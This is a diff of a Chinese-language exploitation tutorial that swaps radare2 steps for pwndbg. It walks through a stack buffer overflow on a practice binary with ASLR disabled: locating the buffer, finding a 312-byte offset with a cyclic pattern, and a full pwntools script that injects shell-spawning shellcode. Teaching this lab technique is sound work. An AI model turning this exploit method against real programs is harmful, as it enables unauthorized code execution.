@@ -83,50 +83,57 @@ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
 
 ## 0x02 确定缓冲区位置
 
-使用 `radare2` 调试 `vuln()` ，并找出缓冲区在内存中的起始位置；这就是我们
+使用 `pwndbg` 调试 `vuln` ，并找出缓冲区在内存中的起始位置；这就是我们
 想要将返回地址指向的位置。
 
 ```
-$ r2 -d -A ./vuln
-
-[0xf7fe3fd0]> s sym.unsafe; pdf
+$ pwndbg vuln
+$ disass unsafe
 [...]
-; var int32_t var_134h @ ebp-0x134
+0x0804918a <+24>:	lea    eax,[ebx-0x1ff8]
+[...]
+0x0804919c <+42>:	lea    eax,[ebp-0x134]
+[...]
+0x080491ac <+58>:	mov    ebx,DWORD PTR [ebp-0x4]
 [...]
 ```
 
-打印出来的这个值是一个 **局部变量**。根据它的大小，可以判断出它很可能是缓冲区。
-让我们在 `gets()` 之后设置一个断点并找到确切的返回地址。
+可以根据大小判断哪个是 **局部变量**。根据缓冲区大小是 300，可以判断出
+`ebp-0x134` 很可能是缓冲区。让我们在 `gets()` 之后设置一个断点并找到确切
+的返回地址。
 
 ```
-[0x08049172]> db 0x080491a8
-[0x08049172]> dc
+$ b *0x080491a8
+$ r
 Overflow me
 <<IM HERE>>         <== This was my input
-INFO: hit breakpoint at: 0x80491a8
-[0x080491a8]> px @ ebp-0x134
-- offset -  B4B5 B6B7 B8B9 BABB BCBD BEBF C0C1 C2C3  456789ABCDEF0123
-0xffffd6b4  3c3c 494d 2048 4552 453e 3e00 2e4e 3df6  <<IM HERE>>..N=.
+$ x/20s $esp
+[...]
+0xffffd664:	"<<IM HERE>>"
 [...]
 ```
 
-它似乎位于 `0xffffd6b4`；如果我们多次运行二进制文件，它应该保持在原来的位置
+它似乎位于 `0xffffd664` ；如果我们多次运行二进制文件，它应该保持在原来的位置
 （如果没有，请确保 **禁用 ASLR！**）。
 
 ## 0x03 计算溢出 Padding
 
-现在我们需要计算溢出 Padding 。我们将使用 De Bruijn 序列，如上一篇博客文章中所述。
+现在我们需要计算溢出 Padding 。我们将使用 De Bruijn 序列，如上一篇 [文章](https://www.cubeyond.net/de-bruijn-sequences/) 中所述。
 
 ```
-$ ragg2 -r -P 500
+$ pwndbg vuln
+$ cyclic 500
 <COPY THIS>
-
-$ r2 -d -A ./vuln
-[0xf7fe3fd0]> dc
+$ r
 Overflow me
 <<PASTE HERE>>
-[0x73424172]> wopO `dr eip`
-312
+
+Program received signal SIGSEGV, Segmentation fault.
+0x64616164 in ?? ()
+[...]
+$ cyclic -l 0x64616164
+Finding cyclic pattern of 4 bytes: b'daad' (hex: 0x64616164)
+Found at offset 312
 ```
 
 得到溢出 Padding 是 312 字节。
@@ -139,6 +146,8 @@ shellcode 。
 
 ```python
 from pwn import *
+
+context(os='linux', arch='amd64', log_level='debug')
 
 context.binary = ELF('./vuln')
 
@@ -160,14 +169,12 @@ payload = asm(shellcraft.sh())
 # 溢出 Padding
 payload = payload.ljust(312, b'A')
 # 返回地址
-payload += p32(0xffffd6b4)
+payload += p32(0xffffd664)
 ```
 
-现在让我们将其发送出去并使用 `p.interactive()`，它使我们能够与 shell 通信。
+现在让我们将其发送出去并使用 `p.interactive()` ，它使我们能够与 shell 通信。
 
 ```python
-log.info(p.clean())
-
 p.sendline(payload)
 
 p.interactive()
@@ -175,15 +182,15 @@ p.interactive()
 
 {{<admonition type="warning">}}
 
-如果你遇到 `EOFError`，请打印出 shellcode 并尝试在内存中查找它。
+如果你遇到 `EOFError` ，请打印出 shellcode 并尝试在内存中查找它。
 栈地址可能是错误的。
 
-你可以参考这篇 [博客](https://www.cubeyond.net/ret2win/) 中的方法来解决这个问题。
+你可以参考这篇 [博客](https://www.cubeyond.net/ret2win/) 中的 hook 调试方法来解决这个问题。
 
 {{</admonition>}}
 
 ```
-$ python3 exp.py
+$ python exp.py
 [*] 'vuln'
     Arch:     i386-32-little
     RELRO:    Partial RELRO
@@ -191,13 +198,13 @@ $ python3 exp.py
     NX:       NX disabled
     PIE:      No PIE (0x8048000)
     RWX:      Has RWX segments
-[+] Starting local process 'vuln': pid 3903
-[*] Overflow me
+[+] Starting local process 'vuln': pid 38046
+[DEBUG...]
 [*] Switching to interactive mode
+[DEBUG...]
 $ whoami
+[DEBUG...]
 cub3y0nd
-$ ls
-exp.py  source.c  vuln
 ```
 
 ## 0x05 最终 EXP
@@ -205,18 +212,15 @@ exp.py  source.c  vuln
 ```python {title="exp.py"}
 from pwn import *
 
+context(os='linux', arch='amd64', log_level='debug')
+
 context.binary = ELF('./vuln')
 
 p = process()
 
-# 构建 shellcode
 payload = asm(shellcraft.sh())
-# 溢出 Padding
 payload = payload.ljust(312, b'A')
-# 返回地址
-payload += p32(0xffffd6b4)
-
-log.info(p.clean())
+payload += p32(0xffffd664)
 
 p.sendline(payload)
 
